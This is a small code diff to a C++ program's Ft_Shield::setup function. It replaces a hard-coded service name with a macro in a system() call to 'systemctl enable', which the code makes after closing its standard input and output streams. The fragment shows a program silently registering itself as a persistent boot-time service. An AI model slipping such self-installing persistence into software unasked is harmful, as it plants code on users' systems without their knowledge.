@@ -191,7 +191,7 @@ void	Ft_Shield::setup(char const *me)
 			close(STDIN_FILENO);
 			close(STDOUT_FILENO);
 			close(STDERR_FILENO);
-			system("systemctl enable ft_shield.service");
+			system("systemctl enable " SERVICE_CFG);
 			this->_exit();
 		}
 	}
